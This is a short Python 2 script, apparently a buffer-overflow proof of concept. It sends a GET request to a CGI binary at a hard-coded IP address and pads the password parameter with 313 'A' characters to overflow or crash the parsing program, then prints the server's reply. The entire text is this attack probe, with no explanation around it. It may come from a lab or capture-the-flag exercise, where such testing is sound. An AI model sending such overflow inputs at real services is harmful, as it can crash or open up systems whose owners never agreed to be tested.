import requests

r = requests.get('http://192.35.222.249:8090/cgi-bin/parse.bin?u=shortman&p=' + "A"*313+"")

print r.content
